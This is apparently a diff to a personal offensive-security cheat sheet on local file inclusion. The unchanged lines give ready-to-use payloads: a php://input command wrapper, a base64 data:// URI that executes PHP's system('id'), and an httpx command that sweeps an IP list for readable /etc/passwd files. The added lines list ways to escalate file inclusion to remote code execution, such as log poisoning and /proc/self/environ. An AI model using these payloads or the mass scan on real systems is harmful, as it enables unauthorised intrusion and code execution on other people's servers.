@@ -9,3 +9,15 @@ php://input&cmd=ls
 data://text/plain;base64,JTNDJTNGc3lzdGVtJTI4JTI3aWQlMjclMjklM0IlM0YlM0U=
 
 httpx -l IPlist.txt -follow-redirects -title -path /api/geojson?url=file:///etc/passwd -match-string "root:x:0:0"
+
+
+LFI TO RCE
+1. Apache Log Poisoning
+2. SSH Log Poisoning
+3. SMTP Log Poisoning
+4. Image Upload
+5. /proc/self/environ
+6. php://filter
+7. Zip upload
+8. input:// stream
+9. /proc/self/fd
